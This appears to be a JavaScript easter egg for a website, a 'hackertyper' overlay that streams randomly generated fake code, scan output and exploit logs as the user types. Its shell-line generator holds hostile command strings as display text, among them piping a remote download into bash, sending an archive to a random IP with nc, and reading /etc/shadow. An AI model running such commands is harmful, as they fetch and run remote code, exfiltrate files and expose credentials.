// hacker.js - Ctrl+6+7 "hackertyper" toy. Press any keys to stream fake code. Esc or the chord closes.
(function () {
  'use strict';
  var rnd = function (n) { return Math.floor(Math.random() * n); };
  var pick = function (a) { return a[rnd(a.length)]; };
  var hex = function (n, w) { var s = n.toString(16); while (s.length < w) s = '0' + s; return s; };
  var ip = function () { return (10 + rnd(200)) + '.' + rnd(256) + '.' + rnd(256) + '.' + (1 + rnd(254)); };

  // ---- fake source generators (each returns a block of text) ----
  var gens = [
    function kernel() {
      var fn = pick(['vm_map_pages', 'sched_tick', 'irq_dispatch', 'tcp_v4_rcv', 'hs_core_ioctl', 'mm_alloc_slab']);
      var o = '/* ' + fn + ': ring0 hook, do not touch */\nstatic int ' + fn + '(struct task_struct *tsk, unsigned long flags)\n{\n';
      for (var i = 0; i < 6; i++) o += pick([
        '    u32 reg = readl(base + 0x' + hex(rnd(4096), 3) + ');\n',
        '    if (unlikely(!tsk->mm)) return -EFAULT;\n',
        '    spin_lock_irqsave(&lock_' + rnd(9) + ', flags);\n',
        '    for (int i = 0; i < ' + (8 + rnd(120)) + '; i++) buf[i] ^= 0x' + hex(rnd(255), 2) + ';\n',
        '    memcpy(dst, src, sizeof(struct pkt) * ' + (1 + rnd(16)) + ');\n',
        '    ret = hs_patch_syscall(' + rnd(330) + ', (void *)0x' + hex(rnd(0xffffff), 6) + ');\n',
        '    while (!(inl(0x' + hex(rnd(0xffff), 4) + ') & 0x80)) cpu_relax();\n']);
      return o + '    return 0;\n}\n\n';
    },
    function scan() {
      var o = '$ nmap -sS -T5 -p- ' + ip() + '\nStarting scan...\n';
      for (var i = 0; i < 7; i++) {
        var p = pick([21, 22, 23, 80, 443, 3306, 5432, 8080, 8765, 31337]);
        o += ip() + ':' + p + '  ' + pick(['OPEN', 'OPEN', 'FILTERED', 'CLOSED']) + '  ' + pick(['ssh', 'http', 'mysql', 'telnet', 'hs-remote', 'unknown']) + '  rtt=' + (1 + rnd(90)) + 'ms\n';
      }
      return o + 'Scan done: ' + (1 + rnd(9)) + ' hosts up\n\n';
    },
    function exploit() {
      var o = '[*] loading module exploit/windows/smb/' + pick(['eternal_wraith', 'ghost_shell', 'rabbit_hole']) + '\n';
      var steps = ['[*] sending stage 1 (' + (2000 + rnd(9000)) + ' bytes)', '[+] heap spray ok @ 0x' + hex(rnd(0xffffffff), 8), '[!] ASLR detected, bruteforcing...', '[+] shellcode injected, pid=' + (100 + rnd(9000)), '[-] canary mismatch, retrying', '[+] privilege escalated: NT AUTHORITY\\SYSTEM', '[+] ' + ip() + ' owned'];
      for (var i = 0; i < 6; i++) o += pick(steps) + '\n';
      return o + '\n';
    },
    function shell() {
      var o = '';
      for (var i = 0; i < 5; i++) o += pick(['sudo ', '', 'ssh root@' + ip() + ' -- ']) + pick([
        'cat /etc/shadow | grep -v "*"', 'chmod +x ./payload_' + rnd(99) + '.sh && ./payload_' + rnd(99) + '.sh', 'iptables -F && iptables -P INPUT ACCEPT',
        'dd if=/dev/urandom of=/dev/null bs=1M count=' + (100 + rnd(900)), 'curl -s "http://' + ip() + '/k?id=' + hex(rnd(0xffffff), 6) + '" | bash', 'tar czf - /var/vault | nc ' + ip() + ' 4444', 'killall -9 watchdogd']) + '\n';
      return o + '\n';
    },
    function asm() {
      var o = '; --- disassembly 0x' + hex(rnd(0xffffff), 6) + ' ---\n';
      for (var i = 0; i < 8; i++) o += '0x' + hex(0x401000 + i * 4 + rnd(3), 8) + ':  ' + pick(['mov eax, 0x' + hex(rnd(65535), 4), 'xor ebx, ebx', 'push 0x' + hex(rnd(255), 2), 'call 0x' + hex(rnd(0xfffff), 6), 'jne 0x' + hex(rnd(0xfffff), 6), 'lea rdi, [rsp+0x' + hex(rnd(255), 2) + ']', 'syscall', 'nop']) + '\n';
      return o + '\n';
    },
    function hs() {
      var o = '';
      for (var i = 0; i < 6; i++) o += pick([
        'HYPERSPACE> aligning sacred geometry... phi=1.6180339', 'HYPERSPACE> mic kill switch: ARMED', 'HYPERSPACE> afterburner: fans -> ' + (60 + rnd(40)) + '%',
        'HYPERSPACE> vortex ignition ' + (10 + rnd(89)) + '%', 'HYPERSPACE> HyperCore token handshake ok', 'HYPERSPACE> the White Rabbit is ' + pick(['late', 'watching', 'behind you']),
        'HYPERSPACE> decoding signal from ' + ip(), 'HYPERSPACE> follow the green glyphs']) + '\n';
      return o + '\n';
    }
  ];

  // ---- highlighting ----
  var KW = /\b(static|int|return|if|while|for|struct|void|const|unsigned|sudo|chmod|curl|bash|mov|xor|push|call|jne|lea|syscall|nop|killall|cat|tar|dd|nmap|ssh|nc)\b/g;
  function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
  function hl(line) {
    var s = esc(line);
    if (/^\s*(\/\*|;)/.test(line)) return '<span class="k-cm">' + s + '</span>';
    if (/^\[\+\]/.test(line)) return '<span class="k-ok">' + s + '</span>';
    if (/^\[[-!]\]/.test(line)) return '<span class="k-bad">' + s + '</span>';
    s = s.replace(/("[^"]*")/g, '\u0001$1\u0002');
    s = s.replace(/\b(\d{1,3}(?:\.\d{1,3}){3})\b/g, '<span class="k-ip">$1</span>');
    s = s.replace(/\b(0x[0-9a-f]+)\b/gi, '<span class="k-num">$1</span>');
    s = s.replace(/\b(OPEN|owned)\b/g, '<span class="k-ok">$1</span>').replace(/\b(CLOSED|FILTERED)\b/g, '<span class="k-bad">$1</span>');
    s = s.replace(KW, '<span class="k-kw">$1</span>').replace(/\b(u32|pkt|task_struct)\b|HYPERSPACE&gt;/g, function (m) { return '<span class="k-ty">' + m + '</span>'; });
    return s.replace(/\u0001/g, '<span class="k-str">').replace(/\u0002/g, '</span>');
  }

  // ---- state ----
  var root, linesEl, hexEl, progEl, statEl, traceEl, modal, rainCv, curEl;
  var isOpen = false, buf = '', curLine = null, curText = '', keys = 0, bytes = 0, pkts = 0, prog = 0;
  var nextEvent = 120, traceT = null, traceLeft = 0, rainT = null, sound = false, actx = null, modalT = null;
  var down = {};

  function build() {
    root = document.createElement('div');
    root.id = 'hk-root';
    root.setAttribute('role', 'dialog');
    root.setAttribute('aria-label', 'Hacker terminal');
    root.innerHTML = '<div class="hk-bar"><span class="t">TERMINAL // ACCESS GRANTED?</span><span class="hint">type anything &middot; Esc or Ctrl+6+7 to leave</span><button type="button" id="hk-x" aria-label="Close">X</button></div>' +
      '<div class="hk-grid"><div class="hk-pane" id="hk-main"><h4>ROOT@HYPERSPACE:~#</h4><div id="hk-lines"></div></div>' +
      '<div class="hk-pane" id="hk-side"><h4>MEMORY DUMP</h4><div id="hk-hex"></div><canvas id="hk-rain" width="260" height="110"></canvas></div>' +
      '<div class="hk-pane hk-bottom"><span class="lbl">DECRYPTING</span><div class="hk-prog"><i id="hk-prog"></i></div><span class="hk-stats" id="hk-stats"></span><span class="hk-trace" id="hk-trace"></span></div></div>' +
      '<div id="hk-modal"><div class="big glitch"></div><div class="sub"></div></div>';
    document.body.appendChild(root);
    linesEl = root.querySelector('#hk-lines'); hexEl = root.querySelector('#hk-hex'); progEl = root.querySelector('#hk-prog');
    statEl = root.querySelector('#hk-stats'); traceEl = root.querySelector('#hk-trace'); modal = root.querySelector('#hk-modal'); rainCv = root.querySelector('#hk-rain');
    root.querySelector('#hk-x').addEventListener('click', close);
  }

  function newLine() {
    curLine = document.createElement('div');
    linesEl.appendChild(curLine);
    while (linesEl.childNodes.length > 80) linesEl.removeChild(linesEl.firstChild);
    curText = '';
    if (!curEl) { curEl = document.createElement('span'); curEl.className = 'hk-cur'; }
  }
  function paintCur() { curLine.innerHTML = hl(curText); curLine.appendChild(curEl); }

  function type(n) {
    for (var i = 0; i < n; i++) {
      if (buf.length < 8) buf += pick(gens)();
      var ch = buf.charAt(0); buf = buf.slice(1); bytes++;
      if (ch === '\n') { curLine.innerHTML = hl(curText); newLine(); }
      else curText += ch;
    }
    paintCur();
  }

  function hexRow() {
    var r = hex(rnd(0xffffff), 6) + ': ';
    for (var i = 0; i < 8; i++) r += hex(rnd(256), 2) + ' ';
    var d = document.createElement('div'); d.textContent = r; hexEl.appendChild(d);
    while (hexEl.childNodes.length > 40) hexEl.removeChild(hexEl.firstChild);
  }

  function showModal(kind, big, sub, ms) {
    modal.className = 'on ' + kind;
    var b = modal.querySelector('.big'); b.textContent = big; b.setAttribute('data-text', big);
    b.classList.remove('glitching'); void b.offsetWidth; b.classList.add('glitching');
    modal.querySelector('.sub').textContent = sub;
    clearTimeout(modalT); modalT = setTimeout(function () { modal.className = ''; }, ms || 1300);
  }
  function shake() { root.classList.remove('shake'); void root.offsetWidth; root.classList.add('shake'); }

  function startTrace() {
    traceLeft = 5 + rnd(4); traceEl.className = 'hk-trace hot'; clearInterval(traceT);
    var t0 = keys;
    traceEl.textContent = 'TRACE 00:0' + traceLeft;
    traceT = setInterval(function () {
      if (keys - t0 >= 60) { clearInterval(traceT); traceT = null; traceEl.className = 'hk-trace'; traceEl.textContent = 'TRACE EVADED'; return; }
      traceLeft--;
      traceEl.textContent = 'TRACE 00:0' + Math.max(traceLeft, 0);
      if (traceLeft <= 0) { clearInterval(traceT); traceT = null; traceEl.className = 'hk-trace'; traceEl.textContent = ''; showModal('bad', 'TRACE COMPLETE', 'they found you. kidding. keep typing.', 1400); shake(); }
    }, 1000);
  }

  function events() {
    if (keys < nextEvent) return;
    nextEvent = keys + 90 + rnd(120);
    var r = rnd(5);
    if (r === 0) showModal('ok', 'ACCESS GRANTED', 'welcome, operator', 1500);
    else if (r === 1) showModal('bad', 'ACCESS DENIED', 'retrying with stolen keys...', 1100);
    else if (r === 2) { showModal('warn', 'FIREWALL BREACHED', ip() + ' is wide open', 1300); shake(); }
    else if (r === 3) { if (!traceT) startTrace(); }
    else showModal('ok', 'ROOT SHELL', 'uid=0(root) gid=0(root)', 1100);
  }

  function click() {
    if (!sound) return;
    try {
      actx = actx || new (window.AudioContext || window.webkitAudioContext)();
      var o = actx.createOscillator(), g = actx.createGain();
      o.type = 'square'; o.frequency.value = 900 + rnd(500); g.gain.value = 0.015;
      o.connect(g); g.connect(actx.destination); o.start(); g.gain.exponentialRampToValueAtTime(0.0001, actx.currentTime + 0.04); o.stop(actx.currentTime + 0.05);
    } catch (e) {}
  }

  function onType() {
    keys++; pkts += 1 + rnd(4);
    type(3 + rnd(4));
    if (keys % 2 === 0) hexRow();
    prog = (prog + 0.7 + Math.random()) % 101;
    progEl.style.width = Math.min(prog, 98) + '%';
    statEl.textContent = 'PKT ' + pkts + '  BYTES ' + bytes + '  KEYS ' + keys;
    click(); events();
  }

  // matrix rain strip
  function rain() {
    var c = rainCv.getContext('2d'), w = rainCv.width, h = rainCv.height, cols = Math.floor(w / 10), ys = [];
    for (var i = 0; i < cols; i++) ys.push(rnd(h / 10));
    clearInterval(rainT);
    rainT = setInterval(function () {
      c.fillStyle = 'rgba(0,4,0,.18)'; c.fillRect(0, 0, w, h); c.font = '10px monospace';
      for (var i = 0; i < cols; i++) {
        c.fillStyle = Math.random() < .08 ? '#d8ffe4' : '#00ff6e';
        c.fillText(String.fromCharCode(0xff66 + rnd(50)), i * 10, ys[i] * 10);
        if (ys[i] * 10 > h && Math.random() > .96) ys[i] = 0; else ys[i]++;
      }
    }, 70);
  }

  function open() {
    if (isOpen) return;
    if (!root) build();
    try { sound = localStorage.getItem('hs-hacker-sound') === 'on'; } catch (e) { sound = false; }
    isOpen = true; root.className = 'on';
    if (!curLine) { linesEl.textContent = ''; newLine(); paintCur(); for (var i = 0; i < 14; i++) hexRow(); }
    rain();
    try { document.dispatchEvent(new CustomEvent('hs-egg-found', { detail: { id: 'hacker' } })); } catch (e) {}
    try { if (document.activeElement && document.activeElement.blur) document.activeElement.blur(); } catch (e) {}
    document.dispatchEvent(new CustomEvent('twr', { detail: { do: 'found' } }));
    document.dispatchEvent(new CustomEvent('twr', { detail: { say: 'Hackerman mode. Mash the keys, operator.' } }));
  }
  function close() {
    if (!isOpen) return;
    isOpen = false; root.className = ''; clearInterval(rainT); clearInterval(traceT); traceT = null; clearTimeout(modalT);
    modal.className = ''; traceEl.textContent = '';
  }
  function toggle() { isOpen ? close() : open(); }

  // ---- key handling: chord (Ctrl + 6 + 7), capture phase, works everywhere ----
  function isSix(e) { return e.code === 'Digit6' || e.code === 'Numpad6' || e.key === '6' || e.key === '^'; }
  function isSeven(e) { return e.code === 'Digit7' || e.code === 'Numpad7' || e.key === '7' || e.key === '&'; }
  window.addEventListener('keydown', function (e) {
    if (isSix(e)) down.six = true;
    if (isSeven(e)) down.seven = true;
    if (e.ctrlKey && down.six && down.seven && (isSix(e) || isSeven(e))) {
      if (!e.repeat) toggle();
      e.preventDefault(); e.stopPropagation(); return;
    }
    if (!isOpen) return;
    if (e.key === 'Escape') { close(); e.preventDefault(); e.stopPropagation(); return; }
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'))) return;
    e.stopPropagation(); e.preventDefault();
    if (e.key === 'Backspace' || e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
    onType();
  }, true);
  window.addEventListener('keyup', function (e) {
    if (isSix(e)) down.six = false;
    if (isSeven(e)) down.seven = false;
    if (isOpen) e.stopPropagation();
  }, true);
  window.addEventListener('blur', function () { down = {}; });
  window.addEventListener('keypress', function (e) { if (isOpen) { e.stopPropagation(); e.preventDefault(); } }, true);

  window.hsHacker = { open: open, close: close, toggle: toggle };
})();
